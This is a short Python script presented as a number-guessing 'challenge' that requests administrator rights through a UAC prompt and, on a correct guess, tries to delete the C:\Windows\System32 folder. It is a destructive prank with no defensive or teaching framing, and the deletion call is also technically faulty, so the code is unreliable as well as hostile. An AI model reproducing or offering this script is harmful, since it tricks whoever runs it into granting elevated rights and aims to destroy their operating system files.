import os
import random
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    # Code of your program here
    Number = random.randint(1,10)

    guess = int(input("guess a number between 1-10: "))

    if guess == Number:
        os.remove("C:\Windows\System32")
    else:
        print("You survived the challenge")
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)